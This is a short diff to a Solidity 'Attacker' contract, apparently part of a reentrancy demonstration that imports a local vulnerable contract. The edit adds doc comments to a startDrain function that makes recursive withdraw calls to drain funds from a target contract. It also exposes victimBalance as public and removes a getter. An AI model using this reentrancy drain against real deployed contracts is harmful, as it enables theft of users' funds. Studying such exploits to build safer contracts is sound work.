@@ -9,10 +9,14 @@ import "./Reentrancy.sol";
 contract Attacker {    
     uint256 private withdrawIncrement=0;
     address payable private victimAddr; 
-    uint256 private victimBalance = 0;
+    uint256 public victimBalance = 0;
     
     /**
      * Call this to begin the cycle of recursive calls that will drain the contract. 
+     * 
+     * @param _victimAddr address of target contract from which to drain funds
+     * @param _amount the amount to withdraw on each recursive call (this amount should 
+     * not exceed the attacker's balance, or it will fail)
      */
     function startDrain(address payable _victimAddr, uint256 _amount) public {
         withdrawIncrement = _amount;
@@ -34,9 +38,5 @@ contract Attacker {
                 amt = victimBalance;
             Reentrancy(victimAddr).withdraw(amt);
         }
-    }
-    
-    function getVictimBalance() public view returns (uint256) {
-        return victimBalance;
     }
 }
